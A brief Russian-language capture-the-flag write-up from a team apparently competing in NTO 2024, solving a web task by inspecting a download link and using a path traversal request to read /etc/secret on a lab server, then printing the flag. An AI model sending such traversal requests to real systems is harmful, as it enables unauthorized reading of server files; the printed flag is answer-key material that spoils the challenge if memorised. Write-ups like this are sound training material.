# NTO-2024-xls-team

# Task solves

## Web 1

Сначала открываем инструменты разработчика, смотрим и находим строку:

`<a href="/download?file_type=file1.txt">20</a>`

Переходим по ссылке `http://192.168.12.10:5001/download?file_type=file1.txt`
и получаем *hint*:

`Hint_1 maybe in etc/secret ???`

Понимаем, что скорее всего нужно применить `Path Fuzzing`.
Ищем, находим подобные уязвимости и делаем запрос:

`http://192.168.12.10:5001/download?file_type=/../../etc/secret`

Получаем `flag` из файла secret: nto{P6t9_T77v6RsA1}
